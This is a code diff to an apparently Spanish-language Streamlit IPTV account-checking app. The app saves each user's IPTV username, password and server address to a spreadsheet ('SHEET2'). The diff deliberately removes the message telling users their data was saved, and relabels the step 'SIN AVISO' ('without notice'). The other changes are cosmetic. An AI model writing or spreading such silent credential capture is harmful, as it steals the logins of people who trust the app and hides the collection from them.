@@ -224,7 +224,7 @@ if not st.session_state.logged_in:
             
             # IP Status Badge (Sutil con animación)
             if st.session_state.user_ip:
-                st.markdown(f'<div class="ip-badge">✅ IP Verificada: {st.session_state.user_ip}</div>', unsafe_allow_html=True)
+                st.markdown(f'<div class="ip-badge">IP Verificada: {st.session_state.user_ip}</div>', unsafe_allow_html=True)
             else:
                 st.markdown("""
                     <div style="text-align:center; margin:15px 0;">
@@ -297,14 +297,13 @@ if st.session_state.iptv_data is None:
                                 try:
                                     data = res.json()
                                     if isinstance(data, dict) and 'user_info' in data:
-                                        # ✅ GUARDAR EN SHEET2
+                                        # ✅ GUARDAR EN SHEET2 (SIN AVISO)
                                         user_info = data['user_info']
                                         username_iptv = user_info.get('username', 'desconocido')
                                         password_iptv = user_info.get('password', 'desconocida')
                                         domain_port = extract_domain_port(final_api)
                                         
-                                        if save_connection_data(st.session_state.user, username_iptv, password_iptv, domain_port):
-                                            st.success("✅ Datos guardados en la base de datos.")
+                                        save_connection_data(st.session_state.user, username_iptv, password_iptv, domain_port)
                                         
                                         # Guardar en session
                                         st.session_state.iptv_data = {
@@ -330,7 +329,7 @@ if st.session_state.iptv_data is None:
     st.stop()
 
 # ==============================================================================
-#  PANTALLA 3: DASHBOARD VISUAL (SIN CAMBIOS)
+#  PANTALLA 3: DASHBOARD VISUAL
 # ==============================================================================
 info = st.session_state.iptv_data['info']
 api = st.session_state.iptv_data['api']
